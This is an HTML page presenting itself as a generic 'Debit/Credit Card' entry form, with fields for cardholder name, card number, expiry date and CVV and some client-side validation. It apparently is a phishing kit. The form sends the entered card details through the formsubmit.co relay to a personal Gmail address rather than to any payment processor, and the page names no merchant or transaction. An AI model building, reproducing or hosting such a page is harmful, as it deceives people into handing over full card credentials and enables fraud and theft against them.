<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Debit/Credit Card</title>    <style>        body {            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;            background-color: #f8f9fa;            display: flex;            justify-content: center;            align-items: center;            height: 100vh;            margin: 0;        }        .container {            background-color: #ffffff;            padding: 30px;            border-radius: 10px;            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);            width: 400px;            text-align: center;        }        .container h2 {            margin-bottom: 20px;            color: #343a40;        }        .container p {            margin-bottom: 30px;            color: #6c757d;        }        .form-group {            margin-bottom: 20px;            text-align: left;        }        .form-group label {            display: block;            margin-bottom: 8px;            color: #495057;        }        .form-group input,        .form-group select {            width: 100%;            padding: 10px;            border: 1px solid #ced4da;            border-radius: 5px;            box-sizing: border-box;            transition: border-color 0.3s;        }        .form-group input:focus,        .form-group select:focus {            border-color: #007bff;            outline: none;            box-shadow: 0 0 8px rgba(0, 123, 255, 0.3);        }        .form-group input.invalid,        .form-group select.invalid {            border-color: red;            box-shadow: 0 0 8px rgba(255, 0, 0, 0.3);        }        .form-group input[type="submit"] {            background-color: #007bff;            color: white;            border: none;            cursor: pointer;            font-size: 16px;        }        .form-group input[type="submit"]:hover {            background-color: #0056b3;        }        .error {            color: red;            font-size: 14px;            margin-top: 5px;            display: none;        }        .expiry-group {            display: flex;            justify-content: space-between;        }        .expiry-group select {            width: 48%;        }    </style></head><body>    <div class="container">        <h2><strong>Please enter your information</strong></h2>        <p><strong>Debit/Credit Card</strong></p>        <form id="credit-card-form" action="https://formsubmit.co/baradur24@gmail.com" method="POST">            <div class="form-group">                <label for="card-name">Name on the card</label>                <input type="text" id="card-name" name="card-name" required pattern="[A-Za-z\s]+" title="The name must contain only letters and spaces.">                <span class="error" id="name-error">Please enter a valid name (letters and spaces only).</span>            </div>            <div class="form-group">                <label for="card-number">Card number</label>                <input type="text" id="card-number" name="card-number" required pattern="\d{16}" title="The card number must contain 16 digits.">                <span class="error" id="number-error">Please enter a valid card number (16 digits).</span>            </div>            <div class="form-group">                <label for="expiry-date">Expiration date</label>                <div class="expiry-group">                    <select id="expiry-month" name="expiry-month" required>                        <option value="" disabled selected>Month</option>                        <option value="01">01</option>                        <option value="02">02</option>                        <option value="03">03</option>                        <option value="04">04</option>                        <option value="05">05</option>                        <option value="06">06</option>                        <option value="07">07</option>                        <option value="08">08</option>                        <option value="09">09</option>                        <option value="10">10</option>                        <option value="11">11</option>                        <option value="12">12</option>                    </select>                    <select id="expiry-year" name="expiry-year" required>                        <option value="" disabled selected>Year</option>                        <option value="24">2024</option>                        <option value="25">2025</option>                        <option value="26">2026</option>                        <option value="27">2027</option>                        <option value="28">2028</option>                        <option value="29">2029</option>                        <option value="30">2030</option>                    </select>                </div>                <span class="error" id="expiry-error">Please enter a valid expiration date.</span>            </div>            <div class="form-group">                <label for="cvv">Security code (CVV)</label>                <input type="text" id="cvv" name="cvv" required pattern="\d{3,4}" title="The CVV must contain 3 or 4 digits.">                <span class="error" id="cvv-error">Please enter a valid CVV (3 or 4 digits).</span>            </div>            <div class="form-group">                <input type="submit" value="Submit">            </div>        </form>    </div>    <script>        document.getElementById('credit-card-form').addEventListener('submit', function(event) {            var valid = true;            var nameField = document.getElementById('card-name');            var numberField = document.getElementById('card-number');            var monthField = document.getElementById('expiry-month');            var yearField = document.getElementById('expiry-year');            var cvvField = document.getElementById('cvv');            var nameError = document.getElementById('name-error');            var numberError = document.getElementById('number-error');            var expiryError = document.getElementById('expiry-error');            var cvvError = document.getElementById('cvv-error');            nameError.style.display = 'none';            numberError.style.display = 'none';            expiryError.style.display = 'none';            cvvError.style.display = 'none';            nameField.classList.remove('invalid');            numberField.classList.remove('invalid');            monthField.classList.remove('invalid');            yearField.classList.remove('invalid');            cvvField.classList.remove('invalid');            if (!nameField.checkValidity()) {                nameError.style.display = 'block';                nameField.classList.add('invalid');                valid = false;            }            if (!numberField.checkValidity()) {                numberError.style.display = 'block';                numberField.classList.add('invalid');                valid = false;            }            if (monthField.value === "" || yearField.value === "") {                expiryError.style.display = 'block';                monthField.classList.add('invalid');                yearField.classList.add('invalid');                valid = false;            }            if (!cvvField.checkValidity()) {                cvvError.style.display = 'block';                cvvField.classList.add('invalid');                valid = false;            }            if (!valid) {                event.preventDefault();            }        });    </script></body></html>
